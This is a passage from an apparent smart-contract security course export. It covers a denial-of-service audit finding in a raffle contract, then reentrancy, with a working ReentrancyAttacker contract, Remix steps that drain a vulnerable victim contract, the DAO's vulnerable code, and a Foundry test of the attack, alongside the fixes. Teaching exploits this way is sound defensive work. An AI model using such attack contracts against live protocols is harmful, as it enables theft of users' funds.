          "markdownContent": "---\ntitle: DoS - Mitigation\n---\n\n_Follow along with this video:_\n\n---\n\n### Recommended Mitigation\n\nOur next step, of course, is providing a recommendation on how to fix this issue.\n\nWe may be tempted to suggest something like _\"Don't check for duplicates.\"_, but it's important to preserve the original functionality as much as possible. If we do suggest a change in functionality, we must be clear in explaining why.\n\nWith that said, here are some potential suggestions we could make.\n\n1. Consider allowing duplicates. Users can make new wallet addresses anyway, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.\n\n2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.\n\n```diff\n+    mapping(address => uint256) public addressToRaffleId;\n+    uint256 public raffleId = 0;\n    .\n    .\n    .\n    function enterRaffle(address[] memory newPlayers) public payable {\n        require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\");\n        for (uint256 i = 0; i < newPlayers.length; i++) {\n            players.push(newPlayers[i]);\n+            addressToRaffleId[newPlayers[i]] = raffleId;\n        }\n\n-        // Check for duplicates\n+       // Check for duplicates only from the new players\n+       for (uint256 i = 0; i < newPlayers.length; i++) {\n+          require(addressToRaffleId[newPlayers[i]] != raffleId, \"PuppyRaffle: Duplicate player\");\n+       }\n-        for (uint256 i = 0; i < players.length; i++) {\n-            for (uint256 j = i + 1; j < players.length; j++) {\n-                require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n-            }\n-        }\n        emit RaffleEnter(newPlayers);\n    }\n.\n.\n.\n    function selectWinner() external {\n+       raffleId = raffleId + 1;\n        require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n```\n\n3. Alternatively, you could use [**OpenZeppelin's EnumerableSet library**](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).\n\n### Wrap Up\n\nThat's all there is to it! Let's add this recommendation to our `findings.md` report for this vulnerability and we can move on to the next issue!\n\n<details>\n<Summary>DoS Writeup</summary>\n\n### [M-#] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants\n\n**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array is an additional check the loop will have to make.\n\n```javascript\n// @audit Dos Attack\n@> for(uint256 i = 0; i < players.length -1; i++){\n    for(uint256 j = i+1; j< players.length; j++){\n    require(players[i] != players[j],\"PuppyRaffle: Duplicate Player\");\n  }\n}\n```\n\n**Impact:** The gas consts for raffle entrants will greatly increase as more players enter the raffle, discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in queue.\n\nAn attacker might make the `PuppyRaffle:entrants` array so big that no one else enters, guaranteeing themselves the win.\n\n**Proof of Concept:**\n\nIf we have 2 sets of 100 players enter, the gas costs will be as such:\n\n- 1st 100 players: ~6252048 gas\n- 2nd 100 players: ~18068138 gas\n\nThis is more than 3x more expensivee for the second 100 players.\n\n<details>\n<summary>Proof of Code</summary>\n\n```js\nfunction testDenialOfService() public {\n      // Foundry lets us set a gas price\n      vm.txGasPrice(1);\n\n      // Creates 100 addresses\n      uint256 playersNum = 100;\n      address[] memory players = new address[](playersNum);\n      for (uint256 i = 0; i < players.length; i++) {\n          players[i] = address(i);\n      }\n\n      // Gas calculations for first 100 players\n      uint256 gasStart = gasleft();\n      puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);\n      uint256 gasEnd = gasleft();\n      uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;\n      console.log(\"Gas cost of the first 100 players: \", gasUsedFirst);\n\n      // Creats another array of 100 players\n      address[] memory playersTwo = new address[](playersNum);\n      for (uint256 i = 0; i < playersTwo.length; i++) {\n          playersTwo[i] = address(i + playersNum);\n      }\n\n      // Gas calculations for second 100 players\n      uint256 gasStartTwo = gasleft();\n      puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);\n      uint256 gasEndTwo = gasleft();\n      uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;\n      console.log(\"Gas cost of the second 100 players: \", gasUsedSecond);\n\n      assert(gasUsedSecond > gasUsedFirst);\n  }\n```\n\n</details>\n<br>\n\n**Recommended Mitigations:** There are a few recommended mitigations.\n\n1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.\n2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.\n\n```diff\n+    mapping(address => uint256) public addressToRaffleId;\n+    uint256 public raffleId = 0;\n    .\n    .\n    .\n    function enterRaffle(address[] memory newPlayers) public payable {\n        require(msg.value == entranceFee * newPlayers.length, \"PuppyRaffle: Must send enough to enter raffle\");\n        for (uint256 i = 0; i < newPlayers.length; i++) {\n            players.push(newPlayers[i]);\n+            addressToRaffleId[newPlayers[i]] = raffleId;\n        }\n\n-        // Check for duplicates\n+       // Check for duplicates only from the new players\n+       for (uint256 i = 0; i < newPlayers.length; i++) {\n+          require(addressToRaffleId[newPlayers[i]] != raffleId, \"PuppyRaffle: Duplicate player\");\n+       }\n-        for (uint256 i = 0; i < players.length; i++) {\n-            for (uint256 j = i + 1; j < players.length; j++) {\n-                require(players[i] != players[j], \"PuppyRaffle: Duplicate player\");\n-            }\n-        }\n        emit RaffleEnter(newPlayers);\n    }\n.\n.\n.\n    function selectWinner() external {\n+       raffleId = raffleId + 1;\n        require(block.timestamp >= raffleStartTime + raffleDuration, \"PuppyRaffle: Raffle not over\");\n```\n\n3. Alternatively, you could use [**OpenZeppelin's EnumerableSet library**](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).\n\n</details>\n",
          "updates": []
        },
        {
          "lessonId": "0733bc61-511d-4f22-8773-3b4239943a85",
          "number": 16,
          "title": "Exploit: Business logic edge case",
          "slug": "exploit-business-logic-edge-case",
          "folderName": "16-exploit-business-logic-edge-case",
          "description": "",
          "duration": 3,
          "videoUrl": "gpV00mHPi15v024Efr11vjG53d0200AWOLPrwLkkFU2BEKk",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/16-exploit-business-logic-edge-case/+page.md",
          "markdownContent": "---\ntitle: Exploit - Business Logic Edge Case\n---\n\n_Follow along with this video:_\n\n---\n\n### Business Logic Edge Case\n\nBy now we've identified fairly clearly how the `enterRaffle` function works. Our finding looks great. Let's next move onto the `refund` function, this one was mentioned explicitly in our documention.\n\n```\nUsers are allowed to get a refund of their ticket & value if they call the refund function\n```\n\nThis is what the function looks like.\n\n```js\n/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`\n/// @dev This function will allow there to be blank spots in the array\nfunction refund(uint256 playerIndex) public {\n    address playerAddress = players[playerIndex];\n    require(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\n    require(playerAddress != address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n\n    payable(msg.sender).sendValue(entranceFee);\n\n    players[playerIndex] = address(0);\n    emit RaffleRefunded(playerAddress);\n}\n```\n\nRemember to start with the documentation so that we understand what's supposed to happen. In order to call this function a player needs to provide their `playerIndex`, and this is acquired through the `getActivePlayerIndex` function.\n\nLet's jump over there quickly.\n\n```js\n/// @notice a way to get the index in the array\n/// @param player the address of a player in the raffle\n/// @return the index of the player in the array, if they are not active, it returns 0\nfunction getActivePlayerIndex(address player) external view returns (uint256) {\n    for (uint256 i = 0; i < players.length; i++) {\n        if (players[i] == player) {\n            return i;\n        }\n    }\n    return 0;\n}\n```\n\nI think we may have stumbled upon our next bug. The logic here has a problem. Can you spot it?\n\n<details>\n<summary>The Problem</summary>\n<br>\n\nWhen looking at this function, we have to ask _\"Why is this returning zero?\"_\n\nArrays begin at index 0, were the player at this index to call this function it would be very unclear whether or not they were in the raffle or not!\n\n</details>\n\n### Wrap Up\n\nWe're not going to go through writing this finding report together, but I absolutely challenge you to write one yourself before moving forward!\n\n**\\*Hint:** It's informational severity\\*\n\nUp next we're going back to the `refund` function!\n",
          "updates": []
        },
        {
          "lessonId": "a4298f9d-7469-40b4-864d-437f10d6bbf4",
          "number": 17,
          "title": "Recon: Refund",
          "slug": "recon-refund",
          "folderName": "17-recon-refund",
          "description": "",
          "duration": 3,
          "videoUrl": "PuTubb3L021vIcpDZ6gYqQJqIH1rvMLxS5cGAwTu2eBM",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/17-recon-refund/+page.md",
          "markdownContent": "---\ntitle: Recon - Refund\n---\n\n_Follow along with this video:_\n\n---\n\n### Return to Refund\n\nComing back to the refund function, let's have a closer look.\n\n```js\n/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`\n/// @dev This function will allow there to be blank spots in the array\nfunction refund(uint256 playerIndex) public {\n    address playerAddress = players[playerIndex];\n    require(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\n    require(playerAddress != address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n\n    payable(msg.sender).sendValue(entranceFee);\n\n    players[playerIndex] = address(0);\n    emit RaffleRefunded(playerAddress);\n}\n```\n\nThis function takes a player's index, and checks the `players` array for the appropriate address. Following this we see two require statements.\n\n```js\nrequire(playerAddress == msg.sender, \"PuppyRaffle: Only the player can refund\");\nrequire(playerAddress !=\n  address(0), \"PuppyRaffle: Player already refunded, or is not active\");\n```\n\nThe first is ensuring that only a player can refund their own ticket/fee.\n\nThe second, while a little less clear, makes more sense if we see how a player is handled after a refund is processed - their `players` index is set to `address(0)`. So the second require is meant to prevent multiple refunds this way.\n\n```js\nplayers[playerIndex] = address(0);\n```\n\nBefore this however, we see the `sendValue` function being called. This is what returns the `entranceFee` back to the player.\n\n---\n\n`sendValue` may look unusual, this is just a simplfied method to transfer funds contained within the [**OpenZeppelin Address.sol library**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol).\n\n> ```js\n> function sendValue(address payable recipient, >uint256 amount) internal {\n>        if (address(this).balance < amount) {\n>            revert AddressInsufficientBalance(address(this));\n>        }\n>\n>        (bool success, ) = recipient.call{value: amount}(\"\");\n>        if (!success) {\n>            revert FailedInnerCall();\n>        }\n>    }\n> ```\n\n---\n\n### Wrap Up\n\nAlready we can see the order of things is going to cause another potential issue. Do you know what it is? Can you spot it?\n",
          "updates": []
        },
        {
          "lessonId": "8596fc74-6778-4b65-bc85-56bedf6e1808",
          "number": 18,
          "title": "Exploit: Reentrancy",
          "slug": "exploit-reentrancy",
          "folderName": "18-exploit-reentrancy",
          "description": "",
          "duration": 14,
          "videoUrl": "2KjHW8LArPS02RZNZb02FweQUeF69mVeusNbTOxuQit94",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/18-exploit-reentrancy/+page.md",
          "markdownContent": "---\ntitle: Exploit - Reentrancy\n---\n\n_Follow along with this video:_\n\n---\n\nLet's see if we can nail down this vulnerability. When we'd run `Slither` earlier, you may recall it had actually found something...\n\nRun it again and we'll have a closer look.\n\n```bash\nslither .\n```\n\nLooking through the output, we can see `Slither` is in fact detecting things in our `refund` function!\n\n<img src=\"/security-section-4/18-exploit-reentrancy/exploit-reentrancy1.png\" style=\"width: 75%; height: auto;\">\n\n### What is a re-entrancy attack and how does it work?\n\nFor this lesson we'll be heavily leaning on our [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo for diagrams and examples to reference. Be sure to clone it so you can see how these vulnerabilities work locally.\n\nHere's our example contract:\n\n```js\ncontract ReentrancyVictim {\n    mapping(address => uint256) public userBalance;\n\n    function deposit() public payable {\n        userBalance[msg.sender] += msg.value;\n    }\n\n    function withdrawBalance() public {\n        uint256 balance = userBalance[msg.sender];\n        // An external call and then a state change!\n        // External call\n        (bool success,) = msg.sender.call{value: balance}(\"\");\n        if (!success) {\n            revert();\n        }\n\n        // State change\n        userBalance[msg.sender] = 0;\n    }\n}\n```\n\nFairly simple. Under normal circumstances\n\nUser A (balance 10 ether) can deposit funds\n\n1. deposit{value: 10 ether}\n\n   <br>userBalance[UserA] = 10 ether\n   <br>contract balance = 10 ether\n   <br>User A balance = 0 ether\n\nAnd then withdraw them\n\n2. withdrawBalance\n\n   <br>userBalance[UserA] = 0 ether\n   <br>contract balance = 0 ether\n   <br>User A balance = 10 ether\n\nThe order of operations is reeally important in these situations. In our `withdrawBalance` function, we see that the function is making an external call _before_ updating the state of the contract.\n\nWhat this means, is that an attacker could have that external call be made in such a way that it triggers a call of the `withdrawBalance` function again (hence - reentrancy).\n\n```js\ncontract ReentrancyAttacker {\n    ReentrancyVictim victim;\n\n    constructor(ReentrancyVictim _victim) {\n        victim = _victim;\n    }\n\n    function attack() public payable {\n        victim.deposit{value: 1 ether}();\n        victim.withdrawBalance();\n    }\n\n    receive() external payable {\n        if (address(victim).balance >= 1 ether) {\n            victim.withdrawBalance();\n        }\n    }\n}\n```\n\nConsider the above attack contract. Seems pretty benign, but let's walk through what's actually happening.\n\n1. Attacker calls the attack function which deposits 1 ether, then immediately withdraws it.\n\n```js\nfunction attack() public payable {\n        victim.deposit{value: 1 ether}();\n        victim.withdrawBalance();\n    }\n```\n\n2. The `ReentrancyVictim` contract does what's it's supposed to and received the deposit, then processs the withdrawal. During this process the victim contract makes a call to the attacker's contract.\n\n**NOTE: THIS IS BEFORE OUR BALANCE HAS BEEN UPDATED**\n\n```js\n(bool success,) = msg.sender.call{value: balance}(\"\");\n        if (!success) {\n            revert();\n        }\n```\n\nWhat happens when a contract receives value? It's going have it's receive/fallback functions triggered. And what does our Attacker's receive function look like?\n\n```js\nreceive() external payable {\n        if (address(victim).balance >= 1 ether) {\n            victim.withdrawBalance();\n        }\n    }\n```\n\nIt calls the `withdrawBalance` function again! Because our previous `withdrawBalance` hasn't updated our balance yet, the contract will happily let us withdraw again.. and again .. and again until all funds are drained.\n\nLet's look at this all put together.\n\n<img src=\"/security-section-4/18-exploit-reentrancy/exploit-reentrancy2.png\" style=\"width: 75%; height: auto;\">\n\n### Wrap Up\n\nRe-entrancy is a a big deal and it's very impactful when it happens. We're really going to nail down our understanding of this attack vector before moving on.\n\nAt it's most minimalistic, re-entrancy generates a loop that continually drains funds from a protocol.\n\n<img src=\"/security-section-4/18-exploit-reentrancy/exploit-reentrancy3.png\" style=\"width: 75%; height: auto;\">\n\nOur next lesson is going to be a hands on example of this vulnerability in Remix. Let's see what this exploit is like in action.\n",
          "updates": []
        },
        {
          "lessonId": "4e5253aa-7047-431d-8c16-c6b408be05e9",
          "number": 19,
          "title": "Reentrancy: Remix example",
          "slug": "reentrancy-remix-example",
          "folderName": "19-reentrancy-remix-example",
          "description": "",
          "duration": 4,
          "videoUrl": "ofbpMEnxat1l00hO021o6i2UfPCttt00jO6SN1Ch52QzA8",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/19-reentrancy-remix-example/+page.md",
          "markdownContent": "---\ntitle: Reentrancy - Remix Example\n---\n\n_Follow along with this video:_\n\n---\n\n### Re-entrancy Remix Example\n\nThe crux to this vulnerability lies in that we're updating the user's balance _last_.\n\n```js\n    function withdrawBalance() public {\n        uint256 balance = userBalance[msg.sender];\n        // An external call and then a state change!\n        // External call\n        (bool success,) = msg.sender.call{value: balance}(\"\");\n        if (!success) {\n            revert();\n        }\n\n        // State change\n        userBalance[msg.sender] = 0;\n    }\n```\n\nThe prevention of re-entrancy is actually very simple.\n\n```js\nfunction withdrawBalance() public {\n        uint256 balance = userBalance[msg.sender];\n\n        // State change\n        userBalance[msg.sender] = 0;\n\n        // External call\n        (bool success,) = msg.sender.call{value: balance}(\"\");\n        if (!success) {\n            revert();\n        }\n    }\n```\n\nThat's it!\n\nThe first time this function is called now, the user's balance is updated to zero before making external calls. This means if an enternal call causes this function to be called again - the user's balance will already be updated as zero, so no further funds will be withdrawn.\n\nLet's see this in action, in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).\n\n### Trying it Out\n\nOnce you're in remix with the re-entrancy examples open, begin by compiling and deploying both contracts.\n\n_Be sure to deploy both contracts, first `ReentrancyVictim` then `ReentrancyAttacker`_\n\n<img src=\"/security-section-4/19-reentrancy-remix/reentrancy-remix1.png\" style=\"width: 75%; height: auto;\">\n\nBoth contracts should have 0 balance. Begin by having a sucker deposit 5 ether into `ReentrancyVictim` contract.\n\n<img src=\"/security-section-4/19-reentrancy-remix/reentrancy-remix2.png\" style=\"width: 75%; height: auto;\">\n\nNow, change the account/wallet you're calling functions from (near the top). Our `ReentrancyAttacker::attack` function requires at least 1 ether. Once that's set and our attack function is called...\n\n<img src=\"/security-section-4/19-reentrancy-remix/reentrancy-remix3.png\" style=\"width: 75%; height: auto;\">\n\nThe attacker has made off with all of the protocol's ETH!\n\n### Wrap Up\n\nWe've seen how impactful overlooked re-entrancy can be and we've seen it in action through remix. Our sc-exploits-minimized repo has some test suites included that will illustrate things locally as well. I encourage you to take a look at those and familiarize yourself with them between lessons if you want to learn more and build on your experience.\n\nIn the next lesson we'll approach how to safeguard ourselves and protocols from re-entrancy.\n",
          "updates": []
        },
        {
          "lessonId": "b7ebb003-a608-4d31-a69c-46de78f4cb81",
          "number": 20,
          "title": "Reentrancy: Mitigation",
          "slug": "reentrancy-mitigation",
          "folderName": "20-reentrancy-mitigation",
          "description": "",
          "duration": 4,
          "videoUrl": "IGzSibsaeUY4WxwVZWazPQi2L9GhXkJooL3WlWpBlJQ",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/20-reentrancy-mitigation/+page.md",
          "markdownContent": "---\ntitle: Reentrancy - Mitigation\n---\n\n_Follow along with this video:_\n\n---\n\nRe-entrancy is a big deal! So, how do we fix this?\n\nThere are a few ways, the easiest of which is adhere to the CEI pattern.\n\n### CEI Pattern\n\n_What's a CEI pattern?_\n\nI'm glad you asked!\n\nCEI stands for Checks, Effects and Interactions and is a best practice for orders of operation.\n\n1. Checks - require statements, conditions\n2. Effects - this is where you update the state of the contract\n3. Interactions - any interaction with external contracts/addresses come last\n\nLet's look at this in the context of our `withdrawBalance` example.\n\n```js\nfunction withdrawBalance() public {\n    // Checks\n        /*None*/\n    //Effects\n    uint256 balance = userBalance[msg.sender];\n    userBalance[msg.sender] = 0;\n    //Interactions\n    (bool success,) = msg.sender.call{value: balance}(\"\");\n    if (!success) {\n        revert();\n    }\n}\n```\n\nOur function has no checks, but simply by reordering things this way, with our effects before interactions, we're guarded against re-entrancy. We can confirm this in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js).\n\n### Remix Confirmation\n\nFirst, let's make sure we've re-ordered things in our contract.\n\n<img src=\"/security-section-4/20-reentrancy-mitigation/reentrancy-mitigation1.png\" style=\"width: 75%; height: auto;\">\n\nNow fund your victim contract and try calling the `attack` function with a second wallet address, as we did before.\n\n<img src=\"/security-section-4/20-reentrancy-mitigation/reentrancy-mitigation2.png\" style=\"width: 75%; height: auto;\">\n\nIt reverts! So, what's happening here?\n\n<img src=\"/security-section-4/20-reentrancy-mitigation/reentrancy-mitigation3.png\" style=\"width: 75%; height: auto;\">\n\n### Alternative Mitigation\n\nThere is another popular way we can protect from re-entrancy and that's through a locking mechanism we could apply to this function.\n\nThis is also very simple to implement and would look something like this:\n\n```js\nbool locked = false;\nfunction withdrawBalance() public {\n    if(locked){\n        revert;\n    }\n    locked = true;\n\n    // Checks\n    // Effects\n    uint256 balance = userBalance[msg.sender];\n    userBalance[msg.sender] = 0;\n    // Interactions\n    (bool success,) = msg.sender.call{value: balance}(\"\");\n    if (!success) {\n        revert();\n    }\n    locked = false;\n}\n```\n\nThis is called a `mutex lock` in computing science. By applying the above logic, we lock the function once it's called so that it can't be re-entered while locked!\n\nAlong this line we also have the [**OpenZeppelin ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) library available to us. This effectively applies locks to our functions under the hood keeping our code clean and professional by leveraging the `nonReentrant` modifier.\n\n### Wrap Up\n\nThat's it! We've learnt 3 simple ways to protect against re-entrancy vulnerabilities in our code.\n\n1. Following CEI - Checks, Effects, Interactions Patterns\n2. Implementing a locking mechanism to our function\n3. Leveraging existing libraries from trust sources like [**OpenZeppelin's ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)\n\nFor such an easy vulnerability to protect against, re-entrancy continues to significantly impact the Web3 ecosystem. Let's take a specific look at how in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "7c86d2b3-42bb-4b17-800a-fbdc70f5e1ad",
          "number": 21,
          "title": "Menace To Society",
          "slug": "reentrancy-menace-to-society",
          "folderName": "21-reentrancy-menace-to-society",
          "description": "",
          "duration": 5,
          "videoUrl": "QuJ6BbhtDyNBqG2Su02Y100IJ4J4fiosyb9TUGFmA00Gxk",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/21-reentrancy-menace-to-society/+page.md",
          "markdownContent": "---\ntitle: Reentrancy - Menace to Society\n---\n\n_Follow along with this video:_\n\n---\n\n### Re-entrancy a Menace\n\nWhy am I stressing re-entrancy so much you might ask? The answer is simple.\n\n- We've known about it since 2016\n- It's easy enough to detect that static analyzers (like Slither) can identify them\n- Web3 is still hit by millions of dollars in re-entrancy attacks per year.\n\nThis is so frustrating!\n\nThere's a [**GitHub Repo**](https://github.com/pcaversaccio/reentrancy-attacks) maintained by Pascal (legend) that catalogues re-entrancy attacks which have occured. I encourage you to look through these examples and really acquire a sense of the scope of the problem.\n\n### Case Study: The DAO\n\n[**The DAO**](https://en.wikipedia.org/wiki/The_DAO) was one of the most famous (or infamous) protocols in Web3 history. As of May 2016, its total value locked was ~14% of all ETH.\n\nUnfortunately, it suffered from a re-entrancy vulnerability in two of its functions.\n\nThe first problem existed in the `splitDao` function, here's the vulnerable section and the whole contract for reference:\n\n```js\ncontract DAO is DAOInterface, Token, TokenCreation {\n    ...\n    function splitDAO(\n        uint _proposalID,\n        address _newCurator\n    ) noEther onlyTokenholders returns (bool _success) {\n\n    Transfer(msg.sender, 0, balances[msg.sender]);\n    withdrawRewardFor(msg.sender); // be nice, and get his rewards\n    totalSupply -= balances[msg.sender];\n    balances[msg.sender] = 0;\n    paidOut[msg.sender] = 0;\n    return true;\n    }\n}\n```\n\n<details>\n<summary>Entire Contract</summary>\n\n```js\ncontract DAO is DAOInterface, Token, TokenCreation {\n    function splitDAO(\n        uint _proposalID,\n        address _newCurator\n    ) noEther onlyTokenholders returns (bool _success) {        Proposal p = proposals[_proposalID];        // Sanity check        if (now < p.votingDeadline  // has the voting deadline arrived?\n            //The request for a split expires XX days after the voting deadline\n            || now > p.votingDeadline + splitExecutionPeriod\n            // Does the new Curator address match?\n            || p.recipient != _newCurator\n            // Is it a new curator proposal?\n            || !p.newCurator\n            // Have you voted for this split?\n            || !p.votedYes[msg.sender]\n            // Did you already vote on another proposal?\n            || (blocked[msg.sender] != _proposalID && blocked[msg.sender] != 0) )  {\n            throw;\n        }        // If the new DAO doesn't exist yet, create the new DAO and store the\n        // current split data\n        if (address(p.splitData[0].newDAO) == 0) {\n            p.splitData[0].newDAO = createNewDAO(_newCurator);\n            // Call depth limit reached, etc.\n            if (address(p.splitData[0].newDAO) == 0)\n                throw;\n            // should never happen\n            if (this.balance < sumOfProposalDeposits)\n                throw;\n            p.splitData[0].splitBalance = actualBalance();\n            p.splitData[0].rewardToken = rewardToken[address(this)];\n            p.splitData[0].totalSupply = totalSupply;\n            p.proposalPassed = true;\n        }        // Move ether and assign new Tokens\n        uint fundsToBeMoved =\n            (balances[msg.sender] * p.splitData[0].splitBalance) /\n            p.splitData[0].totalSupply;\n        if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false)\n            throw;        // Assign reward rights to new DAO\n        uint rewardTokenToBeMoved =\n            (balances[msg.sender] * p.splitData[0].rewardToken) / p.splitData[0].totalSupply;        uint paidOutToBeMoved = DAOpaidOut[address(this)] * rewardTokenToBeMoved /\n            rewardToken[address(this)];        rewardToken[address(p.splitData[0].newDAO)] += rewardTokenToBeMoved;\n        if (rewardToken[address(this)] < rewardTokenToBeMoved)\n            throw;\n        rewardToken[address(this)] -= rewardTokenToBeMoved;        DAOpaidOut[address(p.splitData[0].newDAO)] += paidOutToBeMoved;\n        if (DAOpaidOut[address(this)] < paidOutToBeMoved)\n            throw;\n        DAOpaidOut[address(this)] -= paidOutToBeMoved;        // Burn DAO Tokens\n        Transfer(msg.sender, 0, balances[msg.sender]);\n        withdrawRewardFor(msg.sender); // be nice, and get his rewards\n        totalSupply -= balances[msg.sender];\n        balances[msg.sender] = 0;\n        paidOut[msg.sender] = 0;\n        return true;\n    }\n}\n```\n\n</details>\n\n---\n\nHopefully we can spot the problem above. The DAO was making external calls before updating its state!\n\nThis is seen again in the `withdrawRewardFor` function:\n\n```js\ncontract DAO is DAOInterface, Token, TokenCreation {\n    ...\n    function withdrawRewardFor(address _account) noEther internal\n        returns (bool _success) {\n        if ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply < paidOut[_account])\n            throw;        uint reward =\n            (balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];\n        if (!rewardAccount.payOut(_account, reward))\n            throw;\n        paidOut[_account] += reward;\n        return true;\n    }\n}\n```\n\n---\n\nAn attack of this protocol in June 2016 resulted in the transfer of 3.8 Million Eth tokens and ultimately hardforked the Ethereum network in the recovery efforts.\n\nYou should absolutely read more about this attack [**here**](https://medium.com/@zhongqiangc/smart-contract-reentrancy-thedao-f2da1d25180c).\n\n### Wrap Up\n\nClearly re-entrancy plagues us to this day. Millions of dollars are lost every year. There are even new types of re-entrancy, such as `read-only re-entrancy` (which we'll cover more later).\n\nThe bottom line is - this is preventable.\n\nLet's recap everything we've learnt about this vulnerability, in the next lesson.\n",
          "updates": []
        },
        {
          "lessonId": "79da466e-ddef-4296-8fab-8c80cfcb34bf",
          "number": 22,
          "title": "Reentrancy: Recap",
          "slug": "reentrancy-recap",
          "folderName": "22-reentrancy-recap",
          "description": "",
          "duration": 3,
          "videoUrl": "ZQzGSv02kuMLvaN9imml16BaPWb00ZUxyB2ULSncc7t00I",
          "rawMarkdownUrl": "/routes/security/4-puppy-raffle/22-reentrancy-recap/+page.md",
          "markdownContent": "---\ntitle: Reentrancy - Recap\n---\n\n_Follow along with this video:_\n\n---\n\n### Recap\n\nAt it's most minimalistic, a re-entrancy attack looks like this:\n\n<img src=\"/security-section-4/18-exploit-reentrancy/exploit-reentrancy3.png\" style=\"width: 75%; height: auto;\">\n\nA reentrancy attack occurs when an attacker takes advantage of the recursive calling capability of a contract. By repeatedly calling a function within a contract, the attacker can withdraw funds or manipulate contract state before the initial function call is resolved, often leading to the theft of funds or other unintended consequences.\n\nAs a more indepth reference:\n\n<img src=\"/security-section-4/18-exploit-reentrancy/exploit-reentrancy2.png\" style=\"width: 75%; height: auto;\">\n\nWe learnt that re-entrancy is a _very_ common attack vector and walked through how to indentify and reproduce the vulnerability both in [**Remix**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/reentrancy/Reentrancy.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) and locally as well as how to test for them.\n\n<details>\n<summary>Re-entrancy Test Example</summary>\n\n```js\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.20;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport {ReentrancyVictim, ReentrancyAttacker} from \"../../src/reentrancy/Reentrancy.sol\";\n\ncontract ReentrancyTest is Test {\n    ReentrancyVictim public victimContract;\n    ReentrancyAttacker public attackerContract;\n\n    address victimUser = makeAddr(\"victimUser\");\n    address attackerUser = makeAddr(\"attackerUser\");\n\n    uint256 amountToDeposited = 5 ether;\n    uint256 attackerCapital = 1 ether;\n\n    function setUp() public {\n        victimContract = new ReentrancyVictim();\n        attackerContract = new ReentrancyAttacker(victimContract);\n\n        vm.deal(victimUser, amountToDeposited);\n        vm.deal(attackerUser, attackerCapital);\n    }\n\n    function test_reenter() public {\n        // User deposits 5 ETH\n        vm.prank(victimUser);\n        victimContract.deposit{value: amountToDeposited}();\n\n        // We assert the user has their balance\n        assertEq(victimContract.userBalance(victimUser), amountToDeposited);\n\n        // // Normally, the user could now withdraw their money if they like\n        // vm.prank(victimUser);\n        // victimContract.withdrawBalance();\n\n        // But... we get attacked!\n        vm.prank(attackerUser);\n        attackerContract.attack{value: 1 ether}();\n\n        assertEq(victimContract.userBalance(victimUser), amountToDeposited);\n        assertEq(address(victimContract).balance, 0);\n\n        vm.prank(victimUser);\n        vm.expectRevert();\n        victimContract.withdrawBalance();\n    }\n}\n```\n\n</details>\n<br>\n\nAdditionally, we learnt that `static analysis` tools like `Slither` can even catch this vulnerability (though not always)!\n\nWe also covered how to safeguard against this attack in at least two ways.\n\n- Adhering to the CEI (Checks, Effects, Interactions) pattern, assuring we perform state changes _before_ making external calls.\n- Implenting a nonReentrant modifier like one offered by [**OpenZeppellin's ReentrancyGuard**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol).\n- Applying a mutex lock to our function ourselves.\n<details>\n<summary>Mutex Lock 